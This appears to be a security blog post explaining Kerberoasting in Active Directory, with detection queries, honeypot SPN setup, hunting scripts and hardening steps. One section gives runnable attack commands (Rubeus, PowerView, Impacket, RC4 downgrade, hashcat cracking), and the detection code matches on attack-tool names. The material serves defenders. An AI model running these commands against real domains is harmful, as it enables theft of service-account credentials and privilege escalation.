---
title: "Kerberoasting"
description: "A complete deep dive into Kerberoasting: attack mechanics, tooling, honeypot strategies, detection logic, threat hunting, and layered prevention, nothing taken for granted."
date: 2026-06-12T09:00:00
category: Active-Directory
tags:
  - Active Directory
  - Kerberos
  - Credential Access
  - Threat Hunting
author: "Luca Manfrin"
published: true
archived: false
pinned: false
featured: false
---

## Definition

Kerberoasting is a post-exploitation credential access technique targeting Microsoft Active Directory. It abuses the Kerberos authentication protocol to extract service account credential hashes for offline cracking, requiring only a valid, low-privilege domain authentication session.

The attack exploits a fundamental design characteristic of Kerberos: any authenticated domain user can request a Ticket Granting Service (TGS) ticket for any Service Principal Name (SPN) registered in the directory. These tickets are encrypted with the NTLM hash of the service account's password. The attacker never needs to touch the service account directly.

---

## Understanding the Attack Surface

### What is a Service Principal Name (SPN)?

An SPN is a unique identifier that associates a Kerberos service with a specific account in Active Directory. When a service starts, it registers an SPN so clients know which account to authenticate against.

Examples of SPNs:
```
MSSQLSvc/sqlserver.domain.local:1433
HTTP/intranet.domain.local
CIFS/fileserver.domain.local
```

SPNs are registered on either:
- **User accounts** (service accounts), these are the Kerberoasting targets
- **Computer accounts**, cracking computer account passwords is impractical (120-character random passwords rotated every 30 days)

### Why is the ticket crackable?

The TGS is encrypted with the RC4-HMAC or AES128/AES256 key derived from the service account's password. RC4-HMAC uses only the NT hash directly, modern cracking hardware (RTX 4090) can attempt over 10 billion RC4 Kerberos hashes per second. AES256 is ~100× slower to crack.

Legacy environments often still negotiate RC4 even when AES is available, because older clients or misconfigurations force a downgrade.

---

## How an Attacker Performs This Attack

### Step 1, Enumerate Kerberoastable Accounts

```powershell
# Native LDAP, enumerate all user accounts with an SPN
Get-ADUser -Filter { ServicePrincipalName -ne "$null" } `
  -Properties ServicePrincipalName, PasswordLastSet, PasswordNeverExpires, Enabled, Description |
  Select-Object SamAccountName, Enabled, PasswordLastSet, PasswordNeverExpires, Description,
    @{ n = 'SPN'; e = { $_.ServicePrincipalName -join ' | ' } } |
  Sort-Object PasswordLastSet

# From Linux using ldapsearch (unauthenticated if LDAP anonymous bind is allowed)
ldapsearch -x -H ldap://dc01.domain.local -b "DC=domain,DC=local" \
  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName pwdLastSet

# Impacket, authenticated enumeration
python3 GetUserSPNs.py domain.local/lowprivuser:password -dc-ip 192.168.1.10
```

### Step 2, Request TGS Tickets

```powershell
# PowerView, request and export all TGS hashes in Hashcat format
Import-Module .\PowerView.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt

# Rubeus, roast all kerberoastable accounts at once
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Rubeus, target a single account
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt

# Rubeus, force RC4 downgrade (even if AES is configured)
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:hashes.txt
```

```bash
# Impacket, request tickets and write to file in one step
python3 GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Impacket, with existing TGT (CCACHE)
export KRB5CCNAME=/tmp/user.ccache
python3 GetUserSPNs.py -k -no-pass domain.local/ -dc-ip 192.168.1.10 -request
```

### Step 3, Crack the Hash Offline

```bash
# Hashcat, Kerberos 5 TGS RC4 (mode 13100)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (dramatically increases coverage)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/d3adhob0.rule

# Hashcat, AES-128 (mode 19600) and AES-256 (mode 19700)
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The cracked hash directly gives the service account's plaintext password.

---

## Security Problems

**1. No elevated privileges required.** Any domain user, even a freshly onboarded account with no special rights, can roast every service account in the domain.

**2. Offline cracking is undetectable.** The attacker extracts the hash, disconnects from the network, and cracks on dedicated hardware. No domain controller sees the cracking phase. No lockout policy applies.

**3. Service accounts are chronically neglected.** It is common to find service accounts that:
- Have passwords set once at account creation and never rotated
- Are members of Domain Admins "because the developer needed it at the time"
- Have passwords that follow a known pattern (`ServiceName2019!`)
- Have their password documented in the Description field (yes, this happens)

**4. RC4 is still widely negotiated.** Many environments have AES configured but still allow RC4 as a fallback. Rubeus can force RC4 even when the account supports AES by using `tgtdeleg` to request a downgraded ticket.

**5. Cracking is fast.** An RTX 4090 cracking RC4 Kerberos hashes can test ~10 billion combinations per second. An 8-character mixed-case password with numbers falls in minutes.

---

## How to Detect It

### Primary Signal: Event ID 4769

Event 4769 is generated on domain controllers whenever a TGS is requested. It is inherently noisy, every legitimate service access generates one. The key is filtering for abuse patterns, not raw volume.

**Critical fields in Event 4769:**

| Field | Property Index | Abuse indicator |
|---|---|---|
| Account Name | 0 | Unexpected principal requesting tickets |
| Service Name | 2 | Services the account never accesses |
| Ticket Encryption Type | 6 | `0x17` = RC4 (suspicious), `0x12` = AES256 (normal) |
| Client Address | 9 | Unexpected source IP |

```powershell
# Filter for RC4 TGS requests, primary kerberoasting signal
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4769 } |
  Where-Object { $_.Properties[6].Value -eq '0x17' } |
  Select-Object TimeCreated,
    @{ n = 'RequestingAccount'; e = { $_.Properties[0].Value } },
    @{ n = 'ServiceName';       e = { $_.Properties[2].Value } },
    @{ n = 'ClientIP';          e = { $_.Properties[9].Value } },
    @{ n = 'EncryptionType';    e = { $_.Properties[6].Value } } |
  Where-Object { $_.ServiceName -ne 'krbtgt' -and $_.ServiceName -ne '*$' } |
  Sort-Object TimeCreated -Descending
```

```powershell
# Detect enumeration bursts, one account requesting many distinct SPNs rapidly
$window  = (Get-Date).AddMinutes(-30)
$events  = Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4769
  StartTime = $window
} | Where-Object { $_.Properties[6].Value -eq '0x17' }

$events | Group-Object { $_.Properties[0].Value } |
  Where-Object { $_.Count -gt 5 } |
  Select-Object @{ n = 'Account'; e = { $_.Name } }, Count |
  Sort-Object Count -Descending
```

### Detection with Sysmon

Rubeus and similar tools make direct Windows API calls. Sysmon Process Create (Event 10) can catch suspicious processes accessing LSASS or generating Kerberos activity.

```powershell
# Sysmon Event 1, detect Rubeus or similar tool execution by command line
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 1
} | Where-Object {
  $_.Properties[21].Value -match 'kerberoast|GetUserSPNs|Invoke-Kerberoast'
} | Select-Object TimeCreated,
    @{ n = 'Image';       e = { $_.Properties[4].Value } },
    @{ n = 'CommandLine'; e = { $_.Properties[10].Value } },
    @{ n = 'User';        e = { $_.Properties[12].Value } }
```

---

## Honeypot Strategy, The Highest-Fidelity Detection

A honeypot SPN account generates a zero-false-positive alert: any TGS request for it is immediately high confidence because no legitimate process ever accesses it.

### Why honeypot SPNs work so well

When an attacker enumerates all SPNs and runs `Invoke-Kerberoast` or `Rubeus kerberoast`, they request a ticket for **every** SPN found, including yours. They have no way to know which SPNs are real and which are traps.

### Setting Up a Honeypot Service Account

```powershell
# Step 1: Create the account, make it look convincingly like a service account
New-ADUser `
  -Name              "svc_legacybackup" `
  -SamAccountName    "svc_legacybackup" `
  -UserPrincipalName "svc_legacybackup@domain.local" `
  -Description       "Legacy backup service - DO NOT MODIFY" `
  -AccountPassword   (ConvertTo-SecureString `
                        "Tr@p!9f$2xKq#mLvR8^wN3zP&uYeA6bH" `
                        -AsPlainText -Force) `
  -Enabled           $true `
  -PasswordNeverExpires $true

# Step 2: Register a convincing SPN
Set-ADUser svc_legacybackup `
  -Add @{ ServicePrincipalName = "BackupService/legacynas01.domain.local:9393" }

# Step 3: Verify
Get-ADUser svc_legacybackup -Properties ServicePrincipalName |
  Select-Object SamAccountName, ServicePrincipalName
```

> [!IMPORTANT]
> The password must be genuinely strong (32+ chars, random). A weak honeypot password is dangerous, an attacker cracks it and gains a real foothold. The goal is detection, not entrapment.

### Alert Logic for the Honeypot

```powershell
# Alert: any 4769 for the honeypot SPN, zero legitimate baseline
$honeySpn = "BackupService/legacynas01.domain.local"

Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4769 } |
  Where-Object { $_.Properties[2].Value -like "*$honeySpn*" } |
  Select-Object TimeCreated,
    @{ n = 'RequestingAccount'; e = { $_.Properties[0].Value } },
    @{ n = 'ClientIP';          e = { $_.Properties[9].Value } } |
  ForEach-Object {
    Write-Warning "HONEYPOT HIT: Kerberoast attempt by $($_.RequestingAccount) from $($_.ClientIP) at $($_.TimeCreated)"
    # Send to SIEM / trigger IR workflow
  }
```

### Making the Honeypot More Convincing

Add the account to realistic groups and give it a last-logon history so it doesn't stand out in AD as obviously fake:

```powershell
# Add to a plausible group
Add-ADGroupMember -Identity "Backup Operators" -Members "svc_legacybackup"

# Give it a stale password-last-set date (appears neglected, more tempting to attackers)
# Note: only modifiable via LDAP directly or AD DS tools, not Set-ADUser
# Use the AD module attribute directly:
Set-ADUser svc_legacybackup -PasswordLastSet (Get-Date).AddYears(-2)
# This may require -AllowReversiblePasswordEncryption or direct attribute edit
```

> [!TIP]
> Place the honeypot SPN entry near the top of the SPN list alphabetically. Tools that iterate SPNs in alphabetical order will request the honey ticket early, triggering your alert before they reach the real accounts.

---

## How to Hunt It (Post-Incident)

If you suspect Kerberoasting has already occurred or you're conducting a proactive hunt:

### Phase 1, Map the current attack surface

```powershell
# Complete kerberoastable account inventory with risk scoring
Get-ADUser -Filter { ServicePrincipalName -ne "$null" } `
  -Properties ServicePrincipalName, PasswordLastSet, PasswordNeverExpires,
              Enabled, MemberOf, Description, AdminCount |
  Select-Object SamAccountName, Enabled, PasswordLastSet, PasswordNeverExpires,
    AdminCount, Description,
    @{ n = 'Groups'; e = {
        ($_.MemberOf | ForEach-Object {
          (Get-ADGroup $_).Name
        }) -join ', '
      }
    },
    @{ n = 'PasswordAgeDays'; e = {
        if ($_.PasswordLastSet) {
          [int](((Get-Date) - $_.PasswordLastSet).TotalDays)
        } else { 9999 }
      }
    },
    @{ n = 'SPN'; e = { $_.ServicePrincipalName -join ' | ' } } |
  Sort-Object PasswordAgeDays -Descending
```

### Phase 2, Retrieve historical RC4 TGS events

```powershell
# Scan last 30 days of DC security logs for RC4 TGS requests
$start = (Get-Date).AddDays(-30)

# Run on each DC
$dcs = (Get-ADDomainController -Filter *).HostName

foreach ($dc in $dcs) {
  Write-Host "Querying $dc ..."
  Get-WinEvent -ComputerName $dc -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4769
    StartTime = $start
  } -ErrorAction SilentlyContinue |
    Where-Object {
      $_.Properties[6].Value -eq '0x17' -and
      $_.Properties[2].Value -notmatch 'krbtgt|\$$'
    } |
    Select-Object TimeCreated,
      @{ n = 'DC';       e = { $dc } },
      @{ n = 'Account';  e = { $_.Properties[0].Value } },
      @{ n = 'Service';  e = { $_.Properties[2].Value } },
      @{ n = 'ClientIP'; e = { $_.Properties[9].Value } }
}
```

### Phase 3, Cross-reference with privileged group membership

```powershell
# Do any kerberoastable accounts have admin rights?
$adminGroups = @(
  'Domain Admins', 'Enterprise Admins', 'Schema Admins',
  'Administrators', 'Account Operators', 'Backup Operators',
  'Server Operators', 'Group Policy Creator Owners'
)

foreach ($group in $adminGroups) {
  $members = Get-ADGroupMember $group -Recursive -ErrorAction SilentlyContinue |
    Where-Object { $_.objectClass -eq 'user' }

  foreach ($member in $members) {
    $spns = (Get-ADUser $member -Properties ServicePrincipalName).ServicePrincipalName
    if ($spns) {
      Write-Warning "CRITICAL: $($member.SamAccountName) in '$group' has SPN: $($spns -join ', ')"
    }
  }
}
```

### Phase 4, Check for subsequent suspicious logons

If a service account was Kerberoasted and the password cracked, look for authentication events that don't match normal patterns:

```powershell
# Look for interactive or network logons by service accounts
# (service accounts should only generate logon type 5, service logon)
$svcAccounts = (Get-ADUser -Filter { ServicePrincipalName -ne "$null" }).SamAccountName

Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
  Where-Object {
    $u = $_.Properties[5].Value
    $t = $_.Properties[8].Value   # LogonType
    $svcAccounts -contains $u -and $t -in @(2, 3, 10)  # interactive/network/remote
  } |
  Select-Object TimeCreated,
    @{ n = 'Account';   e = { $_.Properties[5].Value } },
    @{ n = 'LogonType'; e = { $_.Properties[8].Value } },
    @{ n = 'SourceIP';  e = { $_.Properties[18].Value } }
```

---

## How to Prevent It

### 1. Migrate to Group Managed Service Accounts (gMSA)

gMSAs have 240-character randomly generated passwords managed automatically by AD. Offline cracking is computationally infeasible.

```powershell
# Prerequisites: KDS root key (run once per domain, on a DC)
Add-KdsRootKey -EffectiveImmediately
# Production: use -EffectiveTime ((Get-Date).AddHours(-10)) to allow 10h propagation

# Create gMSA
New-ADServiceAccount `
  -Name "gmsa_sql" `
  -DNSHostName "sqlserver.domain.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers_Group" `
  -ServicePrincipalNames "MSSQLSvc/sqlserver.domain.local:1433"

# On the target server, install and verify
Install-ADServiceAccount -Identity "gmsa_sql"
Test-ADServiceAccount   -Identity "gmsa_sql"

# Configure the SQL Server service to use gMSA
# In SQL Server Configuration Manager:
# Service → Log On As → Account Name: domain\gmsa_sql$  (note the trailing $)
# Leave password fields blank, AD manages them
```

### 2. Enforce AES Encryption, Eliminate RC4

```powershell
# Check current encryption support per account
Get-ADUser -Filter { ServicePrincipalName -ne "$null" } `
  -Properties ServicePrincipalName, msDS-SupportedEncryptionTypes |
  Select-Object SamAccountName,
    @{ n = 'EncTypes'; e = { $_.'msDS-SupportedEncryptionTypes' } }
# Value 24 = AES128+AES256, Value 0 or missing = defaults to RC4

# Set AES-only on a service account
Set-ADUser svc_sql -Replace @{ 'msDS-SupportedEncryptionTypes' = 24 }
# 8=AES128, 16=AES256, 24=both, 28=AES128+AES256+RC4, 0=default (RC4)
```

Via Group Policy (domain-wide):

`Computer Configuration → Windows Settings → Security Settings → Account Policies → Kerberos Policy → Configure encryption types allowed for Kerberos`

Enable: `AES128_HMAC_SHA1`, `AES256_HMAC_SHA1`  
Disable: `DES_CBC_CRC`, `DES_CBC_MD5`, `RC4_HMAC_MD5`

> [!WARNING]
> Before disabling RC4 domain-wide, audit all service accounts for legacy applications that cannot support AES. SQL Server versions before 2008 R2, some Java applications, and older NAS devices may break. Test in a lab environment first.

### 3. Enforce Strong Passwords on Service Accounts

Use Fine-Grained Password Policies (PSO) to enforce strong passwords where gMSA is not yet possible:

```powershell
# Create a PSO for service accounts
New-ADFineGrainedPasswordPolicy `
  -Name "ServiceAccountPSO" `
  -Precedence 10 `
  -MinPasswordLength 25 `
  -PasswordHistoryCount 24 `
  -ComplexityEnabled $true `
  -ReversibleEncryptionEnabled $false `
  -MaxPasswordAge "180.00:00:00" `
  -MinPasswordAge "1.00:00:00" `
  -LockoutThreshold 5 `
  -LockoutObservationWindow "00:30:00" `
  -LockoutDuration "00:30:00"

# Apply to a group containing service accounts
Add-ADFineGrainedPasswordPolicySubject `
  -Identity "ServiceAccountPSO" `
  -Subjects "Service_Accounts_Group"
```

### 4. Audit and Remove Unnecessary SPNs

```powershell
# Find duplicate or orphaned SPNs
setspn -T domain.local -F -Q */*

# Find SPNs registered on accounts that are disabled
Get-ADUser -Filter { ServicePrincipalName -ne "$null" -and Enabled -eq $false } `
  -Properties ServicePrincipalName |
  Select-Object SamAccountName, ServicePrincipalName

# Remove an SPN
setspn -D "MSSQLSvc/oldserver.domain.local:1433" svc_sql
```

### 5. Apply Least Privilege

```powershell
# Check AdminCount = 1 on service accounts (indicates past/present admin group membership)
Get-ADUser -Filter { ServicePrincipalName -ne "$null" -and AdminCount -eq 1 } |
  Select-Object SamAccountName

# AdminCount=1 means SDProp has locked down the ACL, review group memberships
Get-ADUser svc_sql -Properties MemberOf |
  Select-Object -ExpandProperty MemberOf |
  ForEach-Object { (Get-ADGroup $_).Name }
```

---

## Conclusion

Kerberoasting persists because it is silent, low-privilege, and targets accounts that are routinely neglected. The detection stack, RC4 filtering on Event 4769, honeypot SPNs, and Sysmon process monitoring, covers the realistic attack scenarios. The prevention stack, gMSA migration, AES enforcement, and strong PSOs, closes the underlying vulnerability. A single honeypot SPN costs five minutes to deploy and provides the highest-fidelity Kerberoasting alert in your entire detection library.
